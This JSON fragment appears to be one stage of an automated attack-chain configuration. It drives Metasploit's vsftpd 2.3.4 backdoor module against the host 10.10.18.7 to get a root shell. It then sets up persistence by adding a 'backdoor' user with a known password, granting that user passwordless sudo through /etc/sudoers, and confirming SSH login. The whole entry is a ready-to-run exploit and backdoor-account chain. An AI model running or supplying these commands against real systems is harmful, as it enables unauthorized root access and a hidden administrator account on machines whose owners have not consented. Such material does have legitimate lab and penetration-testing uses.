        {
            "name": "Chain 1: vsftpd 2.3.4 Backdoor Exploit",
            "use_persistent_session": true,
            "session_name": "vsftpd_session",
            "stages": [
                {
                    "stage": "initial_access",
                    "description": "Exploit vsftpd backdoor on port 21 for root shell",
                    "commands": [
                        {
                            "type": "start_session",
                            "session_name": "vsftpd_session",
                            "command": "msfconsole -q"
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
                            "wait": 2
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set RHOSTS 10.10.18.7",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set RPORT 21",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "exploit -j",
                            "wait": 15
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -l",
                            "wait": 2
                        }
                    ],
                    "verification": "Check for 'Command shell session opened' in sessions list"
                },
                {
                    "stage": "persistence",
                    "description": "Add persistent backdoor user and verify SSH access",
                    "commands": [
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -i 1",
                            "wait": 2
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "useradd -m -s /bin/bash backdoor",
                            "wait": 3
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "echo 'backdoor:backdoor' | chpasswd",
                            "wait": 3
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
                            "wait": 3
                        },
                        {
                            "type": "close_session",
                            "session_name": "vsftpd_session"
                        },
                        {
                            "type": "regular",
                            "command": "sshpass -p 'backdoor' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@10.10.18.7 'id'",
                            "wait": 5
                        }
                    ],
                    "verification": "Verify 'uid=0(root)' or successful SSH login in output"
                }
            ]
        },
